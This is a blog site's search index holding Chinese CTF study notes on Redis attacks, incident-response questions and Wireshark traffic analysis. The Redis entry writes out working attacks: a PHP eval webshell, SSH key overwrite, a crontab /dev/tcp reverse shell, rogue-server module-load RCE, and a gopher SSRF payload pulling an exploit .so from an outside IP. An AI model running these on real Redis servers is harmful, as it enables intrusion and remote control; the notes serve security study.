<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>redis攻击手法</title>
    <url>/2025/06/10/redis/</url>
    <content><![CDATA[<h1 id="redis配置"><a href="#redis配置" class="headerlink" title="redis配置"></a>redis配置</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载文件</span></span><br><span class="line">wget http://download.redis.io/releases/redis-3.2.0.tar.gz</span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar xzf redis-3.2.0.tar.gz</span><br><span class="line"><span class="comment"># 切换目录</span></span><br><span class="line"><span class="built_in">cd</span> redis-3.2.0</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">（1）注释掉<span class="string">&quot;bind 127.0.0.1&quot;</span></span><br><span class="line">注释这行语句，代表任意机器都可以登录redis</span><br><span class="line">（2）protected-mode设置为no，代表关闭安全设置</span><br><span class="line">（3）daemonize设置为<span class="built_in">yes</span>，设置后台运行</span><br></pre></td></tr></table></figure>

<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./src/redis-server redis.conf</span><br><span class="line">./src/redis-cli -a 密码 -h 127.0.0.1 -p 6379 shutdown</span><br><span class="line">./src/redis-cli -h 127.0.0.1 </span><br><span class="line">config <span class="built_in">set</span> requirepass 1234 <span class="comment">#设置密码</span></span><br><span class="line">./src/redis-cli -a 密码 -h 127.0.0.1</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#检查是否启动成功</span></span><br><span class="line">netstate -atopt | grep redis</span><br><span class="line">-a：显示所有连接（包括监听中的和已建立的连接）。</span><br><span class="line"></span><br><span class="line">-t：仅显示 TCP 协议的连接（<span class="string">&quot;t&quot;</span> <span class="keyword">for</span> TCP）。</span><br><span class="line"></span><br><span class="line">-o：显示计时器（Timers），可帮助判断连接处于什么状态（如 keepalive、on/off、<span class="keyword">time</span> <span class="built_in">wait</span> 等）。</span><br><span class="line"></span><br><span class="line">-p：显示与连接关联的进程 PID 和程序名。</span><br><span class="line"></span><br><span class="line">-n：显示数字格式的地址和端口（不进行 DNS 反查，可以更快）</span><br><span class="line"></span><br><span class="line">ps -aux | grep redis</span><br><span class="line">查看redis软件进程</span><br></pre></td></tr></table></figure>



<h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1><p>一般是通过设置数据库备份储存文件来覆盖特殊目标文件,来触发漏洞</p>
<p>条件：</p>
<ul>
<li>redis对外开放</li>
<li>目录可写</li>
<li>密码已知或者未授权</li>
<li>出网（可选）</li>
</ul>
<h2 id="利用redis写webshell"><a href="#利用redis写webshell" class="headerlink" title="利用redis写webshell"></a>利用redis写webshell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># redis客户端远程连接redis数据库</span></span><br><span class="line">redis-cli -h 10.0.1.12 -p 6379</span><br><span class="line"><span class="comment"># 设置redis当前工作路径，设置在web目录下</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/</span><br><span class="line"><span class="comment"># 设置文件名，后缀为可执行文件</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="comment"># 写入shell，key为键名，意为新增一个键值对，当备份时将保存进备份文件</span></span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n\n\n&lt;?php phpinfo();?&gt;\n\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> xx <span class="string">&quot;\n\n\n&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;ch4nge&#x27;]);?&gt;\n\n\n&quot;</span></span><br><span class="line"><span class="comment"># 创建当前数据库的备份。由于我们修改了数据库备份文件为shell.php，工作路径为web目录，因此将生成一个文件保存在web目录。该文件中有可被识别到的PHP语句，将被执行。</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<h2 id="利用公私钥认证获得root权限"><a href="#利用公私钥认证获得root权限" class="headerlink" title="利用公私钥认证获得root权限"></a>利用公私钥认证获得root权限</h2><p>redis服务对外开放，未授权或已知密码，并且ssh服务对外开放，可以通过密钥登认证</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#攻击机生成ssh密钥文件</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="built_in">cd</span> /root/.ssh</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; <span class="built_in">cat</span> id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; key.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> key.txt | redis-cli -h 10.0.1.12 -a ch4nge -x <span class="built_in">set</span> xxx</span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line">ssh -i id_rsa root@10.0.1.12</span><br></pre></td></tr></table></figure>

<p>补:ssh认证的两种方式</p>
<ol>
<li>密码认证:直接提供用户名和密码</li>
<li>公钥认证:公钥在用户账户下的<code>~/.ssh/authorized_keys</code>文件中,用户登录用私钥进行身份验证</li>
</ol>
<h2 id="利用crontab反弹shell-centos"><a href="#利用crontab反弹shell-centos" class="headerlink" title="利用crontab反弹shell(centos)"></a>利用crontab反弹shell(centos)</h2><p>redis服务对外开放，未授权或已知密码，并且靶机出网（可访问攻击机），可以设置计划任务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> xx <span class="string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.10.225/6666 0&gt;&amp;1\n&quot;</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>补:ubuntu要复制到&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;,还要chmod 600+删乱码</p>
<p>(有点没用)</p>
<h1 id="主从复制RCE"><a href="#主从复制RCE" class="headerlink" title="主从复制RCE"></a>主从复制RCE</h1><p>redis4.x和5.x</p>
<p>攻击者（主机)写一个so文件，然后通过FULLRESYNC(全局)同步文件到受害人〈从机)上</p>
<h2 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h2><p>工具</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/n0b0dyCN/redis-rogue-server</span><br><span class="line"><span class="comment"># redis-rogue-server，未授权使用</span></span><br><span class="line"></span><br><span class="line">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</span><br><span class="line"><span class="comment"># Awsome-Redis-Rogue-Server，有授权使用</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 redis_rogue_server.py -rhost ip1 -lhost ip2 -passwd 1234</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20250526235638541.png" alt="image-20250526235638541"></p>
<h2 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h2><p>靶机只允许本地连接（bind 0.0.0.0）</p>
<p>本地连接后，设定主机，同步恶意so文件，进行加载，实现命令执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#攻击机（开启服务器）</span></span><br><span class="line">python3 redis_rogue_server.py -v -path exp.so </span><br><span class="line"></span><br><span class="line"><span class="comment">#靶机</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /tmp <span class="comment">#设置到有写入权限的目录</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename exp.so</span><br><span class="line">slaveof ip 15000 <span class="comment">#设置主机和端口号，进行主从同步，so文件写入</span></span><br><span class="line"></span><br><span class="line">slaveof NO ONE <span class="comment">#关闭本地服务器</span></span><br><span class="line"></span><br><span class="line">module load ./exp.so <span class="comment">#加载恶意文件</span></span><br><span class="line">module list <span class="comment">#查看是否加载成功</span></span><br><span class="line"></span><br><span class="line">system.exec <span class="string">&quot;id&quot;</span> <span class="comment">#调用模块执行命令</span></span><br><span class="line">system.rev ip 666 <span class="comment">#反弹shell</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/../images/1a92a16c-9b3a-417c-bb0e-2bc20feae909.png" alt="1a92a16c-9b3a-417c-bb0e-2bc20feae909"></p>
<p>参考：<a href="https://www.sec-in.com/article/1309">https://www.sec-in.com/article/1309</a></p>
<h1 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h1><h2 id="网鼎杯2020玄武组SSRFME"><a href="#网鼎杯2020玄武组SSRFME" class="headerlink" title="网鼎杯2020玄武组SSRFME"></a>网鼎杯2020玄武组SSRFME</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>要本地访问hint.php,构造如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://0.0.0.0/hint.php</span><br></pre></td></tr></table></figure>

<p>得到redis的密码root</p>
<p>然后利用gopher协议结合redis主从复制rce漏洞进行攻击</p>
<p>构造如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=gopher://0.0.0.0:6397/_auth%2520root%250Aconfig%2520set%2520dir%2520/tmp%250Aconfig%2520set%2520dbfilename%2520exp.so%250Aslaveof%25208.138.103.251%252015000%250Aquit</span><br><span class="line">#实际执行命令如下</span><br><span class="line">auth root</span><br><span class="line">config set dir /tmp</span><br><span class="line">config set dbfilename exp.so</span><br><span class="line">slaveof 8.138.103.251 15000</span><br><span class="line">quit #让运行结束,显示运行结果</span><br><span class="line">#设置从属并开始同步(此处记得要双重url编码)</span><br><span class="line">module load ./exp.so</span><br><span class="line">system.exec &quot;cat /flag&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../%E5%9B%BE%E7%89%87/image-20250529014434949.png" alt="image-20250529014434949"></p>
<p>但是不知道为啥就关容器时候ping通过一次之后怎么试都不通了….</p>
]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>常见题目</title>
    <url>/2025/06/10/%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h1 id="找被修改的密码"><a href="#找被修改的密码" class="headerlink" title="找被修改的密码"></a>找被修改的密码</h1><ul>
<li><p>可疑命令</p>
<p><code>history</code>,审计日志<code>/var/log/secure</code>,<code>/www/</code></p>
</li>
<li><p>可疑程序</p>
<p><code>netstat -adopt</code></p>
</li>
<li><p>查看<code>/temp</code>文件夹，是否有可疑文件</p>
</li>
<li><p>如果有数据库(mysql)</p>
<p>找配置文件(config.inc.php)获取账号密码</p>
<p>登录数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -ukaoshi -p5Sx8mK5ieyLPb84m</span><br><span class="line">show databases;</span><br><span class="line">use kaoshi; #切到kaoshi库</span><br><span class="line">show tables;</span><br><span class="line">select * from jdsklfja;</span><br></pre></td></tr></table></figure>

</li>
<li><p>找流量包，看post发的数据</p>
</li>
</ul>
<h1 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h1><p>邮件记事本打开，可以看到发信人的ip，一般最后一个ip是的</p>
<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228130850727-760442515.png" alt="img"></p>
<h1 id="找后门用户"><a href="#找后门用户" class="headerlink" title="找后门用户"></a>找后门用户</h1><ul>
<li>分析log文件<code>grep &#39;new user&#39;</code></li>
<li>审计&#x2F;etc&#x2F;passwd 注意和<code>root:x:0:0:root:/root:/bin/bash</code>相似的用户</li>
<li>在流量包中搜索<code>id</code></li>
<li>以通过<code>ps -aux</code>查看是否有可疑用户启动的进程</li>
</ul>
<h1 id="数据库加密"><a href="#数据库加密" class="headerlink" title="数据库加密"></a>数据库加密</h1><p>先用np连接数据库，找出被加密的数据库文件</p>
<p><img src="/../images/840b7daac21036e7c0cc9c465750d4bc.png" alt="840b7daac21036e7c0cc9c465750d4bc"></p>
<p>利用时间线索，找上传的木马文件和数据库文件被修改之间的文件</p>
<p><code>find / -type f -newer /var/www/html/plugins/cpg.php ! -newer /var/lib/mysql/JPMorgan@0020Chase/Balance.frm</code></p>
<p>再排查可疑文件(php文件……)</p>
<p>比如下表</p>
<p><img src="/../%E5%9B%BE%E7%89%87/image-20250606001923460.png" alt="image-20250606001923460"></p>
<p>写个解密脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$currentDate</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d&quot;</span>);  </span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;2023-11-18&#x27;</span>);  </span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="string">&quot;DeepMountainsGD&quot;</span>), <span class="number">0</span>, <span class="number">16</span>);  </span><br><span class="line"><span class="variable">$filePath</span> = <span class="string">&quot;/var/lib/mysql/JPMorgan@0020Chase&quot;</span>;  </span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$filePath</span>);  </span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;..&quot;</span>) &#123;  </span><br><span class="line">                    <span class="variable">$fullPath</span> = <span class="variable">$filePath</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file</span>;  </span><br><span class="line">                        <span class="variable">$encryptedContent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fullPath</span>);  </span><br><span class="line">                        <span class="variable">$decryptedContent</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$encryptedContent</span>, <span class="string">&#x27;aes-256-cbc&#x27;</span>, <span class="variable">$key</span>, <span class="number">0</span>, <span class="variable">$iv</span>);  </span><br><span class="line">                            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$fullPath</span>, <span class="variable">$decryptedContent</span>);  </span><br><span class="line">                        &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用<code>php 1.php</code>运行</p>
<p>再<code>sudo systemctl restart mysql</code>重启一下数据库,最后刷新一下</p>
<h1 id="查看黑客篡改的命令"><a href="#查看黑客篡改的命令" class="headerlink" title="查看黑客篡改的命令"></a>查看黑客篡改的命令</h1><ul>
<li><p>审查各种日志文件</p>
</li>
<li><p><code>history</code>命令</p>
</li>
<li><p><code>ps -aux</code>查看进程</p>
</li>
<li><p><code>crontab -l</code>查看启动项</p>
</li>
<li><p>检查系统中的关键命令,可以看看$PATH,看权限设置是否正常<code>ls -la</code>（如<code>/bin</code>、<code>/sbin</code>、<code>/usr/bin</code>等目录下的命令）</p>
</li>
<li><p>检查文件完整性,时间戳和哈希值</p>
<p><code>find / -type f -newer xx</code></p>
</li>
</ul>
<h1 id="寻找被攻击端口"><a href="#寻找被攻击端口" class="headerlink" title="寻找被攻击端口"></a>寻找被攻击端口</h1><ul>
<li>使用命令查找可疑端口</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -i -P -n <span class="comment">#查看活跃端口</span></span><br><span class="line">ss -lnup <span class="comment">#进行查看被监听的端口</span></span><br><span class="line">netsh interface portproxy show all <span class="comment">#端口转发规则</span></span><br></pre></td></tr></table></figure>

<ul>
<li>wireshark中筛选攻击ip,统计端点,按分组排序,在tcp一栏看端口号</li>
<li>windows <code>4624</code>看端口号</li>
</ul>
<h1 id="查找注入代码的工具"><a href="#查找注入代码的工具" class="headerlink" title="查找注入代码的工具"></a>查找注入代码的工具</h1><p>注意隐藏文件和&#x2F;opt文件,后者用于存放第三方软件和应用程序</p>
<p>常见的注入工具:</p>
<ul>
<li>SQL注入:SQLMap&#x2F;Havij&#x2F;SQLNinja&#x2F;JSQL Injection&#x2F;Burp Suite</li>
<li>命令注入:Commix</li>
<li>多种注入:Metasploit&#x2F;W3af</li>
<li>后门工具:Cymothoa</li>
<li>浏览器:BeEF</li>
</ul>
<p>另:</p>
<blockquote>
<p>使用命令运行 .&#x2F;x.xx 执行该文件 将查询的 Exec****** 值 作为flag提交 flag{&#x2F;xxx&#x2F;xxx&#x2F;xxx}</p>
</blockquote>
<p>指的是运行&#x2F;x.xx文件实际运行的软件路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先运行一下,或者通过文件开头的#!usr/bin/python3</span></span><br><span class="line">python3 /tmp/.temp/libprocesshider/1.py</span><br><span class="line">netstat -anipt <span class="comment">#查看是否成功运行</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">which</span> python3 <span class="comment">#查看python路径</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -la /usr/bin/python3 <span class="comment">#查看文件详细信息</span></span><br><span class="line"><span class="comment">#结果如下</span></span><br><span class="line">lrwxrwxrwx. 1 root root 9 Mar 23 2014 /usr/bin/python3 -&gt; python3.4</span><br><span class="line"><span class="comment">#说明python3是软连接指向python3.4</span></span><br><span class="line"><span class="comment">#所以最终flag&#123;/usr/bin/python3.4&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="判断攻击者成功"><a href="#判断攻击者成功" class="headerlink" title="判断攻击者成功"></a>判断攻击者成功</h1><ul>
<li>查找关键词：pwd&#x2F;whoami，查找特殊符号：?</li>
<li>登录页面找302跳转，跳转后可能是welcome.php之类网站</li>
<li>查看浏览器标头，如果是过时浏览器也可能代表成功</li>
</ul>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>流量分析</title>
    <url>/2025/06/10/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="wireshark使用方法"><a href="#wireshark使用方法" class="headerlink" title="wireshark使用方法"></a>wireshark使用方法</h1><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤:"></a>过滤:</h2><h4 id="ip过滤"><a href="#ip过滤" class="headerlink" title="ip过滤"></a>ip过滤</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.addr = ip地址</span><br><span class="line">ip.addr = 192.168.116.138 只显示ip为192.168.116.138有关的数据流</span><br><span class="line"></span><br><span class="line">ip.src == 源ip地址</span><br><span class="line">ip.src = 192.168.116.138 只显示源IP地址为192.168.116.138的数据流</span><br><span class="line"></span><br><span class="line">ip.dst == 目的ip地址</span><br><span class="line">ip.dst = 192.168.116.138 只显示目标IP地址为192.168.116.138的数据流</span><br></pre></td></tr></table></figure>

<h4 id="协议过滤"><a href="#协议过滤" class="headerlink" title="协议过滤"></a>协议过滤</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCP：只显示TCP协议的数据流</span><br><span class="line">HTTP：只显示HTTP协议的数据流</span><br><span class="line">ICMP：只显示ICMP协议的数据流</span><br><span class="line">ARP：只显示ARP协议的数据流</span><br><span class="line">DNS：显示DNS协议的数据流</span><br><span class="line">arp/icmp/http/ftp/dns/ip  筛选协议为arp/icmp/http/ftp/dns/ip的流量包</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http.request.method==“GET” 显示get请求</span><br><span class="line">http.request.method==“POST”  显示POST请求</span><br><span class="line">http.request.uri contains admin  显示url中包含admin的请求</span><br><span class="line">http.request.uri==&quot;/img/logo-edu.gif&quot;  筛选HTTP请求的URL为/img/logo-edu.gif的流量包</span><br><span class="line">http.request.code==404 显示状态码为404</span><br><span class="line">http contains &quot;FLAG&quot; 请求或相应中包含特定内容</span><br><span class="line"></span><br><span class="line">eth.dst ==A0:00:00:04:C5:84 筛选目标mac地址</span><br><span class="line">eth.addr==A0:00:00:04:C5:84 筛选MAC地址</span><br></pre></td></tr></table></figure>

<h4 id="端口过滤"><a href="#端口过滤" class="headerlink" title="端口过滤"></a>端口过滤</h4><p>srcport是源地址，dstport是目的地址，与tcp和udp搭配使用就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcp.port == 80 只显示80端口TCP数据流</span><br><span class="line">udp.prot == 67 只显示67端口UDP数据流</span><br><span class="line">tcp.srcport == 80 只显示源地址的80端口数据流</span><br><span class="line">tcp.dstport == 80 只显示目的地址80端口数据流</span><br><span class="line">udp.srcport == 80  筛选udp协议的源地址的80的流量包</span><br></pre></td></tr></table></figure>

<p>注:都可以使用逻辑运算符</p>
<h2 id="例"><a href="#例" class="headerlink" title="例:"></a>例:</h2><h4 id="筛选开放端口"><a href="#筛选开放端口" class="headerlink" title="筛选开放端口"></a>筛选开放端口</h4><p>[SYN, ACK]的是正常建立了链接</p>
<p>[RST, ACK]是如果主机需要尽快关闭连接或连接超时，端口或主机不可达时发送的</p>
<p>TCP扫描确认端口开放的标志就是返回SYN+ACK的包，所以只需要过滤SYN、ACK状态都为1的包即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.dst == 192.168.162.188 and tcp.connection.synack</span><br><span class="line">tcp.flags.syn==1&amp;&amp;tcp.flags.ack==1tcp.flags.syn==1&amp;&amp;tcp.flags.ack==1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>TCP 三次握手（正常连接建立）<br>当客户端尝试连接服务器的某个端口时，典型的交互如下：</p>
<p>客户端 → 服务器：发送 [SYN]（同步序列号，表示请求建立连接）。</p>
<p>服务器 → 客户端：</p>
<p>如果端口开放：返回 [SYN, ACK]（同意建立连接）。</p>
<p>如果端口关闭：返回 [RST, ACK]（拒绝连接）。</p>
<p>客户端 → 服务器：发送 [ACK]（确认连接，完成握手）。</p>
<p>[FIN, ACK] (关闭连接时的确认包)</p>
</blockquote>
<h4 id="筛选特定文件"><a href="#筛选特定文件" class="headerlink" title="筛选特定文件"></a>筛选特定文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http and not http.request.uri contains &quot;.gif&quot;</span><br></pre></td></tr></table></figure>



<h2 id="协议简介"><a href="#协议简介" class="headerlink" title="协议简介:"></a>协议简介:</h2><p>tcp,dns之类的原始数据都是hex</p>
<p>http是数据包,可以直接显示ascii</p>
<p>原始数据中以0d0a0d0a为请求体&#x2F;响应体和请求头&#x2F;响应头的界限</p>
<h1 id="常见攻击流量"><a href="#常见攻击流量" class="headerlink" title="常见攻击流量:"></a>常见攻击流量:</h1><ul>
<li><p>蚁剑:</p>
<ol>
<li>请求体@ini_set(“display_errors”,”0”);@set_time_limit(0)开头</li>
<li>响应体base64+参数名大多<code>“_0x.....=”（下划线可替换为其他）</code></li>
</ol>
</li>
<li><p>冰蝎:</p>
<ol>
<li>AES加密 + base64编码</li>
<li>webshell连接密码的MD5的前16位，默认连接密码是”rebeyond”(即密钥是md5(‘rebeyond’)[0:16]&#x3D;e45e329feb5d925b)</li>
<li>3.0连接jsp的webshell的请求数据包中的content-type字段常见为application&#x2F;octet-stream,ua头会变</li>
</ol>
</li>
<li><p>哥斯拉:</p>
<ol>
<li>在默认脚本编码的情况下，jsp会出现<code>xc、pass字符和Java反射(ClassLoader，getClass().getClassLoader())，base64加解码</code>等特征</li>
<li><code>Cookie中有一个非常关键的特征，最后会有个分号</code>。估计后续的版本会修复</li>
</ol>
<p>解密请求包：</p>
<blockquote>
